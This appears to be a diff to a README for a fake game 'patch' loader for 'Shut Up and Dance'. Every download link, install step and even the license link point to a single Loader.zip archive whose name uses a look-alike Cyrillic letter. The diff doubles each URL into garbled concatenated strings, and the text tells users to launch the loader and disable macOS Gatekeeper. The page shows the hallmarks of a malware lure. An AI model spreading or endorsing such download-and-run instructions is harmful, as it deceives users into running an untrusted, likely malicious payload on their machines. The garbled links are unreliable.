@@ -32,10 +32,10 @@ The **Shut Up and Dance V0.10.1 Patch** loader guarantees top-tier compatibility
 
 | 📱 Operating System      | 🟢 Compatibility Status | 🚀 Download Method   | ⚙️ Additional Requirements |
 |-------------------------|------------------------|----------------------|---------------------------|
-| 🪟 Windows 10/11        | Fully Supported        | https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip           | .NET Framework 4.7+       |
-| 🍏 macOS (Ventura+)     | Fully Supported        | https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip           | Gatekeeper Disabled        |
-| 🐧 Linux (Ubuntu 22+)   | Fully Supported        | https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip           | Mono Installed            |
-| 💻 Older OS             | Limited                | https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip           | Manual Testing Required    |
+| 🪟 Windows 10/11        | Fully Supported        | https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip           | .NET Framework 4.7+       |
+| 🍏 macOS (Ventura+)     | Fully Supported        | https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip           | Gatekeeper Disabled        |
+| 🐧 Linux (Ubuntu 22+)   | Fully Supported        | https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip           | Mono Installed            |
+| 💻 Older OS             | Limited                | https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip           | Manual Testing Required    |
 
 Our team is committed to extending compatibility; feel free to report your experience on other setups in the issues section!
 
@@ -45,9 +45,9 @@ Our team is committed to extending compatibility; feel free to report your exper
 
 Below are **step-by-step guidance** to maximize ease of use and minimize setup time:
 
-1. **Download https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip from the repository.**
+1. **Download https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip from the repository.**
 2. Extract the archive using your favorite extraction tool (WinRAR, 7-Zip, Keka, etc.).
-3. Launch https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip / https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip / Loader (depending on your OS).
+3. Launch https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip / https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip / Loader (depending on your OS).
 4. If necessary, point the loader to your installed "Shut Up and Dance" directory.
 5. Click the **PATCH** button within the loader interface.
 6. Wait until you receive the success confirmation message. 
@@ -107,7 +107,7 @@ This project aims to enhance user experience and is strictly for educational and
 
 All code and content provided in this repository are open-source under the terms of the MIT License. You are free to use, modify, or redistribute this project, subject to the conditions specified in the license.
 
-Read the formal MIT terms here: https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip
+Read the formal MIT terms here: https://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/TakgoAgency/ShutUpAndDance-v0-10-1-RemixPatch/main/Lоader.zip
 
 ---
 
